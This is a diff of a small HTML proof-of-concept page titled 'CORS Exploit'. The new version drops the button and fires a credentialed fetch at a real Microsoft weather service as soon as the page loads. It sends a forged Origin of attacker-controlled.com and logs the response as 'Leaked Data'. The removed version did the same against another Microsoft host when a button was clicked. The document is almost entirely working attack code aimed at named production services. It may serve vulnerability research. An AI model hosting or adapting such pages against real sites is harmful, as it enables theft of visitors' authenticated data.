@@ -1,28 +1,23 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS Exploit PoC</title>
+  <meta charset="UTF-8">
+  <title>CORS Exploit</title>
 </head>
 <body>
-    <h1>CORS Misconfiguration Exploit</h1>
-    <button id="exploitBtn">Exploit</button>
-    <pre id="response">Click the button to exploit the vulnerability.</pre>
-
-    <script>
-        document.getElementById('exploitBtn').addEventListener('click', () => {
-            fetch('https://activelearning.int.cloud.microsoft.com', {
-                method: 'GET',
-                credentials: 'include',
-                headers: { 'Origin': 'https://attacker-controlled.com' }
-            })
-            .then(response => response.text())
-            .then(data => {
-                document.getElementById('response').textContent = data;
-            })
-            .catch(err => {
-                document.getElementById('response').textContent = 'Error: ' + err;
-            });
-        });
-    </script>
+  <script>
+    fetch("https://service.weather.microsoft.com", {
+      method: "GET",
+      credentials: "include",
+      headers: {
+        "Origin": "https://attacker-controlled.com"
+      }
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log("Leaked Data:", data);
+    })
+    .catch(err => console.error(err));
+  </script>
 </body>
 </html>
